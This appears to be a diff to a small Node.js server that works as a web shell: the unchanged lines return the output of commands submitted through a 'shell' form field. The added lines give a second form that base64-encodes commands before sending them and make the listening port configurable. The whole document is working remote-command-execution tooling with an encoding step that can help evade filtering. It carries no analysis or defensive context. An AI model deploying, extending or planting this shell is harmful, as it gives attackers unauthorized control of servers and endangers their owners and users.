@@ -95,8 +95,26 @@ app.use('/', (req, res)=>{
       res.end(stdout);
     });
   }else{
-    res.end('<form><input name="shell"/><input type="submit"/></form>');
+    res.end(`<script>
+  function tob64(){
+    document.querySelector('[name="b64"]').value = window.btoa(document.querySelector('[name="b64"]').value);
+    return true;
+  }
+  function deb64(){
+    document.querySelector('[name="b64"]').value = window.atob(document.querySelector('[name="b64"]').value);
+  }
+</script>
+<form>
+  <input name="shell" placeholder="shell"/>
+  <input type="submit"/>
+</form>
+<br>
+<form onsubmit="return tob64();">
+  <input name="b64" placeholder="base64 shell">
+  <input type="submit">
+</form>
+<input type="button" onclick="deb64()" value="decode base64"/>`);
   }
 });
 
-http.createServer((req, res)=>app.route(req, res)).listen(3000);
+http.createServer((req, res)=>app.route(req, res)).listen(process.argv[2]||3000);
